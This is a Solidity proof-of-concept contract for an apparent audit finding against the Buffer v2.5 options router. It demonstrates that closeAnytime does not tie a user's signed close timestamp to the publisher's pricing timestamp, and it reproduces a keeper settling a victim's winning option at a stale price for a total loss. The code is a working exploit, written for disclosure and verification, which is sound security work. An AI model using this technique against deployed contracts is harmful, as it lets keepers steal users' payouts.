// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

// Real audited Buffer v2.5 source (unmodified), compiled inside the registry Foundry
// project. NO cheatcodes: the in-browser EVM deploys `Exploit` and calls run().
// block.timestamp is set via setup.blockTimestamp in the poc-config (the cheatcode-free
// equivalent of the registry test's vm.warp).
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/core/BufferRouter.sol";
import "../src/core/BufferBinaryOptions.sol";
import "../src/core/BufferBinaryPool.sol";
import "../src/core/OptionsConfig.sol";
import "../src/core/Validator.sol";
import "../src/interfaces/Interfaces.sol";

// --- opaque out-of-scope boundary doubles (NOT the finding) ---
contract MockUSDC_S is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}
contract Booster_S is IBooster {
    function getUserBoostData(address, address) external pure override returns (UserBoostTrades memory) { return UserBoostTrades(0, 0); }
    function updateUserBoost(address, address) external override {}
    function getBoostPercentage(address, address) external pure override returns (uint256) { return 0; }
}
contract OptionStorage_S is IOptionStorage { function save(uint256, address, address) external override {} }
contract PoolOIStorage_S is IPoolOIStorage {
    function updatePoolOI(bool, uint256) external override {}
    function totalPoolOI() external pure override returns (uint256) { return 0; }
}
contract Referral_S is IReferralStorage {
    function codeOwner(string memory) external pure override returns (address) { return address(0); }
    function traderReferralCodes(address) external pure override returns (string memory) { return ""; }
    function getTraderReferralInfo(address) external pure override returns (string memory, address) { return ("", address(0)); }
    function setTraderReferralCode(address, string memory) external override {}
    function setReferrerTier(address, uint8) external override {}
    function referrerTierStep(uint8) external pure override returns (uint8) { return 0; }
    function referrerTierDiscount(uint8) external pure override returns (uint32) { return 0; }
    function referrerTier(address) external pure override returns (uint8) { return 0; }
}
contract Registrar_S is IAccountRegistrar {
    mapping(address => AccountMapping) public override accountMapping;
    function setOneCT(address user, address oneCT) external { accountMapping[user] = AccountMapping(oneCT, 0); }
    function registerAccount(address, address, bytes memory) external override {}
}
/// ERC-1271 smart account the controller can make attest to specific message digests
/// (a faithful model of the real 1CT / oracle key — the finding is a schema gap, not
/// signature forgeability).
contract Wallet1271_S {
    mapping(bytes32 => bool) public approved;
    function approve(bytes32 digest) external { approved[digest] = true; }
    function isValidSignature(bytes32 hash, bytes calldata) external view returns (bytes4) {
        return approved[hash] ? bytes4(0x1626ba7e) : bytes4(0xffffffff);
    }
}
/// A separate LP so the drained funds genuinely belong to a third party.
contract LpHelper_S {
    function provide(BufferBinaryPool pool, MockUSDC_S usdc, uint256 amount) external {
        usdc.approve(address(pool), type(uint256).max);
        pool.provide(amount, 0);
    }
}

/// Trivial pass-through of the REAL BufferRouter (adds only open-time seed + digest
/// view helpers; overrides no protocol logic — closeAnytime/verify* run the audited
/// code). Named distinctly from the registry harness to avoid artifact collisions.
contract RouterView is BufferRouter {
    constructor(address _publisher, address _sfPublisher, address _admin, address _accountRegistrar)
        BufferRouter(_publisher, _sfPublisher, _admin, _accountRegistrar) {}

    function seedOption(
        address optionsContract, address user, address signer, uint256 queueId,
        uint256 strike, uint256 amount, uint256 totalFee, uint256 queuedTime, uint256 period
    ) external returns (uint256 optionId) {
        IBufferBinaryOptions.OptionParams memory p = IBufferBinaryOptions.OptionParams({
            strike: strike, amount: amount, period: period, allowPartialFill: false,
            totalFee: totalFee, user: user, referralCode: "", baseSettlementFeePercentage: 0
        });
        optionId = IBufferBinaryOptions(optionsContract).createFromRouter(p, queuedTime);
        queuedTrades[queueId] = QueuedTrade({
            user: user, totalFee: totalFee, period: period, targetContract: optionsContract,
            strike: strike, slippage: 0, allowPartialFill: false, referralCode: "",
            traderNFTId: 0, settlementFee: 0, isLimitOrder: false, isTradeResolved: true,
            optionId: optionId, isEarlyCloseAllowed: true
        });
        optionIdMapping[optionsContract][optionId] = OptionInfo({ queueId: queueId, signer: signer, nonce: 0 });
    }
    function _domainSep() internal view returns (bytes32) {
        return keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("Validator")), keccak256(bytes("1")), block.chainid, address(this)));
    }
    function closeAnytimeDigest(string memory assetPair, uint256 timestamp, uint256 optionId) external view returns (bytes32) {
        bytes32 hashData = keccak256(abi.encode(
            keccak256("CloseAnytimeSignature(string assetPair,uint256 timestamp,uint256 optionId)"),
            keccak256(bytes(assetPair)), timestamp, optionId));
        return keccak256(abi.encodePacked("\x19\x01", _domainSep(), hashData));
    }
    function publisherDigest(string memory assetPair, uint256 timestamp, uint256 price) external pure returns (bytes32) {
        bytes32 hashData = keccak256(abi.encodePacked(assetPair, timestamp, price));
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hashData));
    }
    function marketDirectionDigest(IBufferRouter.CloseTradeParams memory params, uint256 queueId) external view returns (bytes32) {
        QueuedTrade memory qt = queuedTrades[queueId];
        bytes32 hashData = Validator.getMarketDirectionHashWithSF(params, qt, params.marketDirectionSignInfo);
        return keccak256(abi.encodePacked("\x19\x01", _domainSep(), hashData));
    }
}


/// AuditVault #55637 [H-05] — closeAnytime never requires the user's
/// closeAnytime-signature timestamp to match the publisher (pricing) timestamp.
/// verifyCloseAnytime binds only (assetPair, userTimestamp, optionId) — NOT the
/// price — so a user's close authorization can be paired with publisher pricing from
/// a completely different time. With private keeper mode off, a malicious keeper
/// settles a user's winning option against a stale, unfavorable price, so the user
/// receives nothing instead of the payout they signed for.
contract Exploit {
    MockUSDC_S public usdc;
    BufferBinaryPool public pool;
    BufferBinaryOptions public options;
    OptionsConfig public config;
    Registrar_S public registrar;
    RouterView public router;
    Wallet1271_S public oneCT;
    Wallet1271_S public publisher;
    LpHelper_S public lp;

    address internal constant SF_SINK = address(0x5E77);
    address internal constant VICTIM = address(0xA11CE);
    address internal constant OTHER = address(0xBEEF);
    uint256 internal constant STRIKE = 1_000e8;
    uint256 internal constant AMOUNT = 100e6;
    uint256 internal constant FEE = 60e6;
    uint256 internal constant T_USER = 5_000; // when the user signed (price was 1500)

    bool public proven;
    uint256 public victimLoss;

    constructor() {
        usdc = new MockUSDC_S();
        pool = new BufferBinaryPool(ERC20(address(usdc)), 0);
        config = new OptionsConfig(pool);
        options = new BufferBinaryOptions();
        registrar = new Registrar_S();
        oneCT = new Wallet1271_S();
        publisher = new Wallet1271_S();
        lp = new LpHelper_S();
        router = new RouterView(address(publisher), address(publisher), address(this), address(registrar));

        options.initialize(
            ERC20(address(usdc)), ILiquidityPool(address(pool)), IOptionsConfig(address(config)),
            IReferralStorage(address(new Referral_S())), IBufferBinaryOptions.AssetCategory.Crypto, "ETH", "USD"
        );
        config.setIV(10_000);
        config.setSettlementFeeDisbursalContract(SF_SINK);
        config.setOptionStorageContract(address(new OptionStorage_S()));
        config.setPoolOIStorageContract(address(new PoolOIStorage_S()));
        config.setBoosterContract(address(new Booster_S()));
        config.setEarlyCloseThreshold(0);
        config.toggleEarlyClose();

        pool.grantRole(pool.OPTION_ISSUER_ROLE(), address(options));
        options.grantRole(options.ROUTER_ROLE(), address(router));
        options.approvePoolToTransferTokenX();
        router.setInPrivateKeeperMode();

        usdc.mint(address(lp), 1_000e6);
        lp.provide(pool, usdc, 1_000e6);
    }

    function _params(uint256 optId, uint256 price, bool isAbove, uint256 mdTs, uint256 pubTs, uint256 userTs)
        internal view returns (IBufferRouter.CloseAnytimeParams memory cap)
    {
        IBufferRouter.CloseTradeParams memory ctp = IBufferRouter.CloseTradeParams({
            optionId: optId, targetContract: address(options), closingPrice: price, isAbove: isAbove,
            marketDirectionSignInfo: IBufferRouter.SignInfo({ signature: hex"01", timestamp: mdTs }),
            publisherSignInfo: IBufferRouter.SignInfo({ signature: hex"01", timestamp: pubTs })
        });
        cap = IBufferRouter.CloseAnytimeParams({
            closeTradeParams: ctp, userSignInfo: IBufferRouter.SignInfo({ signature: hex"01", timestamp: userTs })
        });
    }
    function _attestUser(IBufferRouter.CloseAnytimeParams memory cap, uint256 queueId) internal {
        oneCT.approve(router.closeAnytimeDigest("ETHUSD", cap.userSignInfo.timestamp, cap.closeTradeParams.optionId));
        oneCT.approve(router.marketDirectionDigest(cap.closeTradeParams, queueId));
    }
    function _attestPublisher(IBufferRouter.CloseAnytimeParams memory cap) internal {
        publisher.approve(router.publisherDigest("ETHUSD", cap.closeTradeParams.publisherSignInfo.timestamp, cap.closeTradeParams.closingPrice));
    }
    function _close(IBufferRouter.CloseAnytimeParams memory cap) internal {
        IBufferRouter.CloseAnytimeParams[] memory arr = new IBufferRouter.CloseAnytimeParams[](1);
        arr[0] = cap;
        router.closeAnytime(arr);
    }
    function _state(uint256 optId) internal view returns (uint256 s) {
        (IBufferBinaryOptions.State st, , , , , , , ) = options.options(optId);
        s = uint256(st);
    }

    // block.timestamp = 50000 (setup.blockTimestamp). Option opened t=1000, expiring
    // t=4600. The user signs a close at T_user=5000, when the price was 1500 (ITM).
    function run() external payable {
        uint256 queuedTime = 1_000;
        uint256 period = 3_600; // expiration = 4600

        // --- CONTROL: what the user signed for — priced 1500 @ T_user => FULL 100 ---
        registrar.setOneCT(OTHER, address(oneCT));
        usdc.mint(address(options), FEE);
        uint256 ctrlId = router.seedOption(address(options), OTHER, address(oneCT), 2, STRIKE, AMOUNT, FEE, queuedTime, period);
        IBufferRouter.CloseAnytimeParams memory intended = _params(ctrlId, 1_500e8, true, T_USER, T_USER, T_USER);
        _attestUser(intended, 2);
        _attestPublisher(intended);
        _close(intended);
        require(usdc.balanceOf(OTHER) == AMOUNT, "correctly-priced close should pay 100");

        // --- EXPLOIT: keeper reuses the user's T_user close sig, but pairs it with a
        // STALE, unfavorable publisher price (900 @ a DIFFERENT timestamp 9000) ---
        registrar.setOneCT(VICTIM, address(oneCT));
        usdc.mint(address(options), FEE);
        uint256 optId = router.seedOption(address(options), VICTIM, address(oneCT), 1, STRIKE, AMOUNT, FEE, queuedTime, period);
        // The user genuinely authorized closing at T_user (bound to optionId, T_user)
        // and their direction (a call). Neither authorization binds the price/pubTs.
        IBufferRouter.CloseAnytimeParams memory intercepted = _params(optId, 900e8, true, T_USER, 9_000, T_USER);
        _attestUser(intercepted, 1);
        _attestPublisher(intercepted); // publisher genuinely signed 900 @ ts=9000
        require(intercepted.closeTradeParams.publisherSignInfo.timestamp
                != intercepted.userSignInfo.timestamp, "pricing ts must differ from user ts");

        uint256 vicBefore = usdc.balanceOf(VICTIM);
        _close(intercepted); // @> verifyCloseAnytime never ties userTs to the pricing ts
        uint256 vicPayout = usdc.balanceOf(VICTIM) - vicBefore;

        // === HARM: the user's winning option is settled worthless at a mismatched
        // pricing timestamp — they lose the full 100 they signed to collect ===
        require(_state(optId) == uint256(IBufferBinaryOptions.State.Expired), "victim option not worthless");
        require(vicPayout == 0, "victim unexpectedly paid");
        victimLoss = AMOUNT - vicPayout; // 100
        proven = (victimLoss == AMOUNT);
        require(proven, "harm not reproduced");
    }
}
